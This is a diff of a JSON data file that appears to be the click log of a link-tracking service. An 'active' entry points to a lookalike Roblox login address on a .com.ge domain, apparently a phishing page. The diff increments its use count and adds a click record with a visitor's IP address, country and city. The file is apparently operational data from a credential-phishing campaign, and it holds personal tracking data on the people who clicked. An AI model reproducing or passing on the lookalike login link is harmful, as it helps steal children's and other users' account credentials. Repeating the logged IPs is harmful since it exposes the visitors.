@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 987,
+    "useCount": 988,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8016,6 +8016,14 @@
         "city": "Santa Rosa",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777219282741,
+        "ip": "105.112.105.108",
+        "country": "Nigeria",
+        "city": "Benin City",
+        "flag": "🇳🇬",
+        "countryCode": "NG"
       }
     ]
   },
